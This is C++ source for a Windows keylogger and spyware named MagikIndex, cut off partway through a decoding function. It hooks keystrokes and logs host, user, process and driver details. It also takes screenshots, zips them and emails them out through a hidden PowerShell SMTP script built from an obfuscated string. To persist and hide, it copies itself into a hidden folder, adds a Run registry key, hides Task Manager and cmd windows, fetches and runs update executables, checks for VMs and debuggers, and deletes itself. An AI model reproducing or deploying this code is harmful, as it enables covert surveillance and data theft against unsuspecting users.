#include "common.h"
#include "logo.h"

#pragma warning( push )
#pragma warning( disable : 4477 )

int Counter;
bool mutex;
HHOOK hhkLowLevelKybd;
Log MyLog;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{


    //FreeConsole();

    CreateMutexA(0, FALSE, "Local\\$MagikIndex$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }

    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);

    DWORD Tick1 = GetTickCount();
    
    int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();

    srand(RandSeed);

    bool ThrowAwayFlag = false;
    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
    std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
    std::string CurrentDir = std::string(PathToFile).substr(0, pos);
    /*if (SecurityLevel == 3 && StrStrA(GetCommandLineA(),"rebooted") == NULL) {      //why did i put this here kekw
        RegisterMyProgramForStartup("MIndex",PathToFile,"rebooted");
        exit(0);
    }*/

    if (DelayExecution) {
        int Divider = 20 , DividedSleep = (DelayTime + rand()%100+10) / Divider;
        //LARGE_INTEGER delay;
        //delay.QuadPart = -10000 * (DividedSleep * 1000);
        //pNtDelayExecution(FALSE, &delay);
        for (int j = 0; j <= Divider; j++) {
            Sleep(DividedSleep);
        }
    }

    if (ShatterAttack) {
        unsigned long ThreadId;
        CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
    }

    bool FirstLog = true;
    if (ScreenGrab) {
        unsigned long ThreadId2;
        CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
    }

    AntiDBG DebugItem;
    DebugItem.Initialize();
    TrustItems Trust = DebugItem.TrustItem;
    bool TrustTooLow = false;
    if ((SecurityLevel + 1) * 25 > DebugItem.trust) {
        if (QuitIfUntrust) {
            FinalExit();
        }
        TrustTooLow = true;                                         
    }else if (Trust.HasActiveInternet && !Trust.IsInVM) {
        std::string VersionFile = CurrentDir + "\\Version.inf";
        std::string UpdatedExe = CurrentDir + "\\MagikIndekkusu.exe";
        std::string UpdateLink;
        VersionDownload:
        URLDownloadToFileA(NULL, HardDecode(GitVersionLink).c_str(), VersionFile.c_str(), 0, NULL);
        SetFileAttributesA(VersionFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
        std::ifstream VersionFileIO(VersionFile);
        if (!VersionFileIO.eof()) {
            std::getline(VersionFileIO, UpdateLink, '\n');
            //VersionFile.erase(VersionFile.size() - 1);
            if (strcmp(UpdateLink.c_str(), CurrentVersion ) != 0) {
                std::getline(VersionFileIO, UpdateLink, '\n');
                URLDownloadToFile(NULL, UpdateLink.c_str(), UpdatedExe.c_str(), 0, NULL);
                SetFileAttributesA(UpdatedExe.c_str(), FILE_ATTRIBUTE_HIDDEN); 
                VersionFileIO.close();
                DeleteFileA(VersionFile.c_str());
                VersionFile = "/C timeout 3 /nobreak > Nul & start " + UpdatedExe;
                ShellExecuteA(0, "open", "cmd.exe", VersionFile.c_str(), 0, SW_HIDE);
                FinalExit();
            }
            else {
                VersionFileIO.close();
                DeleteFileA(VersionFile.c_str());
            }
        }else {
            VersionFileIO.close();
            DeleteFileA(VersionFile.c_str());
            if (!ThrowAwayFlag) {
                ThrowAwayFlag = true;
                VersionFileIO.close();
                goto VersionDownload;
            }
            VersionFileIO.close();
        }
    }
    //add special security routines, example:
    // if(Trust.HasRunningAntiMalware && DebugItem.trust > 75){ reboot to safemode and disable them }
    // or
    // if( classic sandbox parameters ){ act like a normal program to evade detection }

Log:

    hhkLowLevelKybd = 0;
    Counter = 0;
    mutex = false;

    MyLog.CreateLog();

    DWORD Tick = GetTickCount();

    std::string VersionText = "MagikIndex ";
    std::string TimeText = "Current Tick:";
    std::string ComputerText = "Host Name:";
    std::string UsernameText = "User Name:";
    std::string InternetText = "Internet Status:";
    std::string WidthText = "Screen Width:";
    std::string HeightText = "Screen Height:";
    std::string AspectRatioText = "Aspect Ratio:";
    std::string WindowsText = "Windows Version:";
    std::string OEMText = "OEM Number:";
    std::string CPUNumberText = "Number Of Cores:";
    std::string CPUTypeText = "CPU Type:";
    std::string CPUBrand = "CPU Brand And Model:";
    std::string GenuineText = "Genuine Windows:";
    std::string SlowText = "Low-End CPU:";
    std::string MouseText = "Number Of Mouse Buttons:";
    std::string MonitorText = "Number Of Monitors:";
    std::string LanguageText = "Install Language:";
    std::string CurrencyText = "Install Currency:";
    std::string MiddleEastText = "Middle-East PC:";
    std::string BootText = "Normal Boot:";
    std::string RAMText = "RAM Size:";
    std::string SeedText = "Randomness Seed:";
    std::string CopiedFileText = "Made executable \"";
    std::string CryptText = "Encrypted with ";
    std::string DiskText = "Found partitions:\n";

    VersionText += CurrentVersion;
    if (IsMajor)
        VersionText += " Major Release - ";
    else
        VersionText += " Minor/Dev Release - ";

    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");

    std::string LogTime = std::to_string(Tick);

    SYSTEMTIME SysTime;
    char TimeBuffer[512];
    ZeroMemory(&TimeBuffer, sizeof(TimeBuffer));
    GetLocalTime(&SysTime);

    std::string StartDate = "_________" + VersionText;
    StartDate += std::to_string(SysTime.wDay);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wMonth);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wYear);
    StartDate += "  ";
    StartDate += std::to_string(SysTime.wHour);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wMinute);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wSecond);
    StartDate += "_________\n";

    MyLog.LogItChar(MyLogo);
    MyLog.LogItChar("\n");
    MyLog.LogItChar(StartDate);

    if (!CryptLogs) {
        MyLog.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
        MyLog.LogItChar("Not crypting the logs...");
    }else{
        MyLog.LogItChar("Started in normal mode...");
        CryptText += "Secure Random Key Shift...";
        MyLog.LogItChar(CryptText);
    }

    if (FirstLog) {
        if (Trust.IsResCheck)
            MyLog.LogItChar("Resolution ratio mismatch, trust decreased...");
        if (Trust.IsInVM)
            MyLog.LogItChar("VM Guest specific files found, trust decreased...");
        if (Trust.IsHostingAVM)
            MyLog.LogItChar("VM Host specific files found, trust increased...");
        if (Trust.IsSmallHardDrive)
            MyLog.LogItChar("HardDrive is under the set minimum, trust decreased...");
        if (Trust.IsSmallRAM)
            MyLog.LogItChar("RAM is under the set minimum, trust decreased...");
        if (Trust.IsBeingDebugged)
            MyLog.LogItChar("Process is being debugged, trust decreased...");
        if (Trust.HasOneCore)
            MyLog.LogItChar("CPU Core Number is under the set minimum, trust decreased...");
        if (Trust.HasMultipleMonitors)
            MyLog.LogItChar("Multiple monitor setup found, trust increased...");
        if (Trust.HasBeenTimepatched)
            MyLog.LogItChar("Process has been timepatched, trust decreased...");
        if (Trust.UserIsInactive)
            MyLog.LogItChar("User's mouse hasn't moved for 10s, trust decreased...");
        if (Trust.HasActiveInternet)
            MyLog.LogItChar("Active internet connection found, trust increased...");
        if (Trust.Proxied)
            MyLog.LogItChar("Proxy/Fake connection found, trust decreased...");
        if (Trust.HasRunningAntiMalware)
            MyLog.LogItChar("Running Anti-Malware solution found, trust increased...");
        if (Trust.HasMoreThan20Apps)
            MyLog.LogItChar("More than 20 apps installed, trust increased...");
        if (Trust.ExtUserActivity)
            MyLog.LogItChar("No user input in the past 15s, trust decreased...");
    }

    if (TrustTooLow) {
        MyLog.LogItChar("Trust factor:" + std::to_string(DebugItem.trust));
        MyLog.LogItChar("Trust factor too low, quitting...");
        MyLog.SendLog();
        FinalExit();                                                                               //could just act normal instead of autodeleting, which is sus
    }

    DWORD Size = MAX_LENGTH+1;

    char HostName[MAX_LENGTH+1];

    char UserName[MAX_LENGTH+1];

    std::string InternetStatusString = "Not connected, error: ";

    DWORD DWFlags;

    //if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {    //switch between these two ways to check as you see fit, or even use both
    if (InternetGetConnectedState(&DWFlags,NULL)){
        InternetStatusString = "Connected";
    }else{
        InternetStatusString += std::to_string(GetLastError());
        InternetStatusString += ", returned flags: ";
        InternetStatusString += std::to_string(DWFlags);
    }

    GetComputerNameA(HostName,&Size);

    GetUserNameA(UserName,&Size);

    if (FirstLog) {

        MyLog.LogItChar("First MyLog of the session, copying files and adding to startup...");

        std::string DestinationFile = "C:\\Users\\";
        DestinationFile += UserName;
        DestinationFile += "\\Music\\MagikIndex";


        CreateDirectoryA(DestinationFile.c_str(), NULL);

        SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);

        if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
            std::string Command = "/C del /f /q ";
            Command += DestinationFile;
            Command += "\\*.*";
            ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
            MyLog.LogItChar("Cleaned MagikIndex folder...");
            Sleep(200);
        }
        DestinationFile += "\\";

        std::string CopiedFile;

        char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
        for (int i = 0; i < 15; i++) {
            CopiedFile += CharacterSet[rand() % 61 + 0];
        }

        DestinationFile += CopiedFile;

        DestinationFile += ".exe";

        CopyFileA(PathToFile, DestinationFile.c_str(), false);

        CopiedFileText += CopiedFile;
        CopiedFileText += ".exe\"...";
        MyLog.LogItChar(CopiedFileText);

        RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");

        MyLog.LogItChar("Registered executable for startup...");

    }else{
        MyLog.LogItChar("Not the first MyLog of the session, skip copying files...");
    }

    int x1, y1, x2, y2, w, h, mo, mb;
    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    mo = GetSystemMetrics(SM_CMONITORS);
    mb = GetSystemMetrics(SM_CMOUSEBUTTONS);
    w = x2 - x1;
    h = y2 - y1;
    double Ratioed = (double)w / h;
    std::string Width = std::to_string(w);
    std::string Height = std::to_string(h);
    std::string WindowsVersion = "Unknown";
    std::string Monitors = std::to_string(mo);
    std::string MouseButtons = std::to_string(mb);
    std::string BootMode = "Yes";
    PBYTE WKSTAPointer;
    WKSTA_INFO_100 WKSTABuf;
    NetWkstaGetInfo(NULL, 100, &WKSTAPointer);
    memcpy(&WKSTABuf, WKSTAPointer, sizeof(WKSTABuf));
    WindowsVersion = WKSTABuf.wki100_ver_major;
    WindowsVersion += ".";
    WindowsVersion += WKSTABuf.wki100_ver_minor;
    if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
        BootMode = "No";
    }
    std::string SlowMachine = "No";
    if (GetSystemMetrics(SM_SLOWMACHINE) != 0) {
        SlowMachine = "Yes";
    }
    std::string MiddleEast = "No";
    if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
        MiddleEast = "Yes";
    }
    if (IsWindowsXPOrGreater()) {
        WindowsVersion = "XP / Vista";
    }
    if (IsWindows7OrGreater())
    {
        WindowsVersion = "Seven";
    }
    if (IsWindows7SP1OrGreater())
    {
        WindowsVersion = "Seven SP1";
    }
    if (IsWindows8OrGreater())
    {
        WindowsVersion = "Eight";
    }
    if (IsWindows8Point1OrGreater())
    {
        WindowsVersion = "Eight.one";
    }
    if (IsWindows10OrGreater())
    {
        WindowsVersion = "Ten";
    }
    if (IsWindowsServer())
    {
        WindowsVersion = "Server";
    }

    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);
    MEMORYSTATUSEX RAMStatus;
    RAMStatus.dwLength = sizeof(RAMStatus);
    GlobalMemoryStatusEx(&RAMStatus);
    std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
    std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
    std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
    std::string RAMAmount = std::to_string((RAMStatus.ullTotalPhys / 1024) / 1024);
    
    std::string IsGenuine = "Yes";
    CONST SLID AppId = WINDOWS_SLID;
    SL_GENUINE_STATE GenuineState;
    HRESULT hResult;

    hResult = SLIsGenuineLocal(&AppId, &GenuineState, NULL);

    if (hResult == S_OK) {
        if (GenuineState != SL_GEN_STATE_IS_GENUINE) {
            IsGenuine = "No";
        }
    }

    char LanguageIdentifier[100];
    char CurrIdentifier[100];
    GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGLANGUAGE, LanguageIdentifier, sizeof(LanguageIdentifier));
    GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGCURRNAME, CurrIdentifier, sizeof(CurrIdentifier));

    TimeText += LogTime;
    MyLog.LogItChar(TimeText);

    ComputerText += HostName;
    MyLog.LogItChar(ComputerText);

    UsernameText += UserName;
    MyLog.LogItChar(UsernameText);

    InternetText += InternetStatusString;
    MyLog.LogItChar(InternetText);

    WidthText += Width;
    MyLog.LogItChar(WidthText);

    HeightText += Height;
    MyLog.LogItChar(HeightText);

    AspectRatioText += std::to_string(Ratioed);
    MyLog.LogItChar(AspectRatioText);

    WindowsText += WindowsVersion;
    MyLog.LogItChar(WindowsText);

    OEMText += OEMNumber;
    MyLog.LogItChar(OEMText);

    RAMText += RAMAmount;
    RAMText += " MB";
    MyLog.LogItChar(RAMText);

    CPUNumberText += CPUCores;
    MyLog.LogItChar(CPUNumberText);

    CPUTypeText += CPUType;
    MyLog.LogItChar(CPUTypeText);

    CPUBrand += GetCpuInfo();
    MyLog.LogItChar(CPUBrand);

    GenuineText += IsGenuine;
    MyLog.LogItChar(GenuineText);

    MouseText += MouseButtons;
    MyLog.LogItChar(MouseText);

    MonitorText += Monitors;
    MyLog.LogItChar(MonitorText);

    BootText += BootMode;
    MyLog.LogItChar(BootText);

    SlowText += SlowMachine;
    MyLog.LogItChar(SlowText);

    LanguageText += LanguageIdentifier;
    MyLog.LogItChar(LanguageText);

    CurrencyText += CurrIdentifier;
    MyLog.LogItChar(CurrencyText);

    MiddleEastText += MiddleEast;
    MyLog.LogItChar(MiddleEastText);

    SeedText += std::to_string(RandSeed);
    MyLog.LogItChar(SeedText);


    for (int i = (int)'A'; i < (int)'Z'; i++) {
        std::string DriveLetter = {};
        DriveLetter += (char)i;
        DriveLetter += ":\\";
        ULARGE_INTEGER DiskSize;
        UINT DriveType = GetDriveTypeA(DriveLetter.c_str());
        //MessageBoxA(NULL,std::to_string(DriveType).c_str(), DriveLetter.c_str(),MB_OK);
        if ( DriveType != DRIVE_UNKNOWN && DriveType != DRIVE_NO_ROOT_DIR) {
            if (GetDiskFreeSpaceExA(DriveLetter.c_str(), NULL, &DiskSize, NULL) || (DriveType != DRIVE_CDROM && DriveType != DRIVE_REMOVABLE)) {
                DiskText += (char)i;
                DiskText += ":\\  Type:";
                DiskText += std::to_string(DriveType);
                DiskText += "  Size:";
                DiskText += std::to_string((DiskSize.QuadPart / 1073741824));
                DiskText += "GB,\n";
                DiskSize.QuadPart = 0;
            }
        }
    }
    DiskText.erase(DiskText.size()-2);
    DiskText += "\n";
    MyLog.LogItChar(DiskText);

    MyLog.LogItChar("_____________________________________________\nList of running processes: \n");

    HANDLE hpSnap;
    PROCESSENTRY32 pentry;
    hpSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hpSnap != INVALID_HANDLE_VALUE) {
        pentry.dwSize = sizeof(PROCESSENTRY32);
    }
    else {
        return false;
    }
    if (!Process32First(hpSnap, &pentry)) {
        CloseHandle(hpSnap);
        return false;
    }
    do {
        MyLog.LogItChar(pentry.szExeFile);
    } while (Process32Next(hpSnap, &pentry));

    MyLog.LogItChar("_____________________________________________\nList of device drivers: \n");

    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    if (K32EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        char szDriver[1024];
        cDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < cDrivers; i++)
        {
            if (K32GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
            {
                MyLog.LogItChar(szDriver);
            }
        }
    }
    else
    {
        MyLog.LogItChar("Not enough memory for driver enumeration.");
    }

    MyLog.LogItChar("\n_____________________________________________\n");

    std::thread t1(Hooker);
    //t1.detach();
    Sleep(50);
    while (!mutex) {
        Sleep(5);
    }
    t1.join();
    MyLog.LogItChar("\n_____________________________________________\n");
    MyLog.LogItChar("Character limit hit, sending MyLog...");

    MyLog.SendLog();
    FirstLog = false;

    goto Log;
    return 0;
}

int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the directory being   deleted,   without trailing backslash
{
    int len = (int)strlen(dir) + 2; // required to set 2 nulls at end of argument to SHFileOperation.
    char* tempdir = (char*)malloc(len);
    memset(tempdir, 0, len);
    strcpy(tempdir, dir);

    SHFILEOPSTRUCTA file_op = {
      NULL,
      FO_DELETE,
      tempdir,
      NULL,
      FOF_NOCONFIRMATION |
      FOF_NOERRORUI |
      FOF_SILENT,
      false,
      0,
      "" };
    int ret = SHFileOperationA(&file_op);
    free(tempdir);
    return ret; // returns 0 on success, non zero on failure.
}


void TakeScreenShot(const char* filename) {
    int x1, y1, x2, y2, w, h;

    // get screen dimensions
    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    w = x2 - x1;
    h = y2 - y1;

    // copy screen to bitmap
    HDC     hScreen = GetDC(NULL);
    HDC     hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

    SaveHBITMAPToFile(hBitmap, filename);
    //CLEAN
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
};

BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
{
    std::string base64;
    HDC hDC;
    int iBits;
    WORD wBitCount;
    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0, dwWritten = 0;
    BITMAP Bitmap0;
    BITMAPFILEHEADER bmfHdr;
    BITMAPINFOHEADER bi;
    LPBITMAPINFOHEADER lpbi;
    HANDLE fh, hDib, hPal, hOldPal2 = NULL;
    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
    DeleteDC(hDC);
    if (iBits <= 1)
        wBitCount = 1;
    else if (iBits <= 4)
        wBitCount = 4;
    else if (iBits <= 8)
        wBitCount = 8;
    else
        wBitCount = 24;
    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = Bitmap0.bmWidth;
    bi.biHeight = -Bitmap0.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = wBitCount;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrImportant = 0;
    bi.biClrUsed = 256;
    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8
        * Bitmap0.bmHeight;
    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
    *lpbi = bi;

    hPal = GetStockObject(DEFAULT_PALETTE);
    if (hPal)
    {
        hDC = GetDC(NULL);
        hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
        RealizePalette(hDC);
    }


    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER)
        + dwPaletteSize, (BITMAPINFO*)lpbi, DIB_RGB_COLORS);

    if (hOldPal2)
    {
        SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
        RealizePalette(hDC);
        ReleaseDC(NULL, hDC);
    }

      fh = CreateFile(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);

        if (fh == INVALID_HANDLE_VALUE)
            return FALSE;
    
    bmfHdr.bfType = 0x4D42; // "BM"
    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    bmfHdr.bfSize = dwDIBSize;
    bmfHdr.bfReserved1 = 0;
    bmfHdr.bfReserved2 = 0;
    bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
    /*
        base64.append("<img src=\"data:image/jpeg;base64,");
        base64.append((LPSTR)&bmfHdr);
        base64.append((LPSTR)&lpbi);
        cout<< base64;
    */
     WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);

        WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
    
    GlobalUnlock(hDib);
    GlobalFree(hDib);
    CloseHandle(fh);
    return TRUE;
}



ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer

    char* AppData = nullptr;
    DWORD Size = MAX_LENGTH + 1;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
    std::string CurrentLog;
    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
    //strcat_s(AppData, sizeof(AppData), "\\MagikGlass");
    std::string ScreenshotDir = AppData;
    ScreenshotDir += "\\MagikGlass";
    DWORD DWFlags;

    while (1) {
        SilentlyRemoveDirectory(ScreenshotDir.c_str());
        Sleep(60000);
        CreateDirectoryA(ScreenshotDir.c_str(), NULL);
        SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
        for (int i = 0; i < ScreenshotsPerZip; i++) {
            CurrentLog = ScreenshotDir;
            CurrentLog += "\\ScreenShot";
            CurrentLog += std::to_string(rand() % 10000 - 1000);
            CurrentLog += ".png";

            TakeScreenShot(CurrentLog.c_str());

            Sleep(SecondsBetweenScreenshots*1000);
        }
        std::string ZipPath = ScreenshotDir;
        ZipPath += "\\Zip";
        ZipPath += std::to_string(rand() % 10000 - 1000);
        ZipPath += ".zip";

        FILE* f = fopen(ZipPath.c_str(), "wb");
        fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
        fclose(f);

        const char* files[] = {
            ScreenshotDir.c_str()
        };

        {
            CoInitialize(NULL);
            CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
            CoUninitialize();
        }

        if (!InternetGetConnectedState(&DWFlags, NULL)) {
            //SetUploadTask(Emailer, ZipPath);
        }
        else {
            std::string Command = "/C powershell ";
            char SysDir[MAX_PATH];
            GetSystemDirectoryA(SysDir, MAX_PATH);
            DWORD WrittenBytes, DWFlags;
            char* AppData = nullptr;
            size_t AppDataSize;
            strcat_s(SysDir, MAX_PATH, "\\cmd.exe");
            _dupenv_s(&AppData, &AppDataSize, "APPDATA");
            std::string Powershell = AppData;
            Powershell += "\\MagikGlass\\PSScript";
            Powershell += std::to_string(GetTickCount());
            Powershell += ".PS1";
            std::string PSStartup = "MagikMailer";
            PSStartup += std::to_string(GetTickCount());
            HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            std::string a = HardDecode("yLqyY[rTpdnTY\\{P2c{;4f2XoVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiOJdjnIfwXI\\nL5Sw:o\\wnGWW32WmqS\\3LJfmCURiy4eVXIdkHodH7{do7YUSTXVVTkEreFQ3CEN{Xof{X4WyTZdVTEM27Y\\rz4SyTZdV7EdrHYVwSZ\\QDEflXock;WN5XoVi2FKx\\odLDHXPPHLMeUdxPoNunY[vfoNyTZd|fEK;Cken\\penPHWW32WmqygMmU\\wnIdw;ILqCk\\rrCfnnYfT3EKzCEfwX5dF3EK66EQwilN6CkdxnIflXodw;4[vS5enTJK;CU\\wnIdw;IL");
            a += SendersEmail;
            a += "', '";
            a += SendersPsw;
            a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
            a += SendersEmail;
            a += "'\n$ReportEmail.To.Add('";
            a += RecieversEmail;
            a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
            a += ZipPath.c_str();
            a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
            WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
            CloseHandle(PS1File);
            Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
            Command += Powershell;
            Command += "\"";
            if (!InternetGetConnectedState(&DWFlags, NULL)) {
                RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
            }
            else {
                ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
            }
        }

        Sleep(140000);

    }
}

int CalculateDirSize(std::string DirectoryToCheck) {

    HANDLE hFind;
    WIN32_FIND_DATAA data;

    DirectoryToCheck += "\\*.*";

    int FileCounter = 0;

    //char FilePath[MAX_PATH + 1];
    DWORD FileSize = MAX_PATH + 1;

    hFind = FindFirstFileA(DirectoryToCheck.c_str(), &data);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            //GetFinalPathNameByHandleA(hFind, FilePath, FileSize, 0x0);
            //if (!(GetFileAttributesA(FilePath) & FILE_ATTRIBUTE_DIRECTORY)) {
            FileCounter++;
            //}
        } while (FindNextFileA(hFind, &data));
        FindClose(hFind);
    }

    return FileCounter;
}


BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    char szValue[count] = {};


    strcpy_s(szValue, "\"");
    strcat_s(szValue, pathToExe);
    strcat_s(szValue, "\" ");

    if (args != NULL)
    {
        strcat_s(szValue, args);
    }

    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

ULONG WINAPI Protect(LPVOID Parameter) {

    if (IsDebuggerPresent()) {
        exit(0);
    }
    while (1) {

        HWND Prog;
        Prog = FindWindowA(NULL, "Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Windows Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Command Prompt");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "C:\\Windows\\System32\\cmd.exe");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Run");
        ShowWindow(Prog, 0);
        Sleep(200);
    }
    return 0;
}

std::string GetCpuInfo()
{
    std::array<int, 4> integerBuffer = {};
    constexpr size_t sizeofIntegerBuffer = sizeof(int) * integerBuffer.size();
    std::array<char, 64> charBuffer = {};
    constexpr std::array<int, 3> functionIds = {
        0x8000'0002,
        0x8000'0003,
        0x8000'0004
    };
    std::string cpu;
    for (int id : functionIds)
    {
        __cpuid(integerBuffer.data(), id);
        std::memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);
        cpu += std::string(charBuffer.data());
    }
    return cpu;
}

BOOL fexists(std::string filename) {
    DWORD dwAttrib = GetFileAttributes(filename.c_str());

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void FinalExit() {
    char PathToSelf[MAX_PATH];
    GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
    std::string Command = "/C timeout 3 /nobreak > Nul & Del /f /q \"";
    Command += PathToSelf;
    Command += "\"";
    ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
    exit(0);
}

std::string HardDecode(std::string EncodedString) {
    std::string Ret = { NULL };
    std::string Buf;
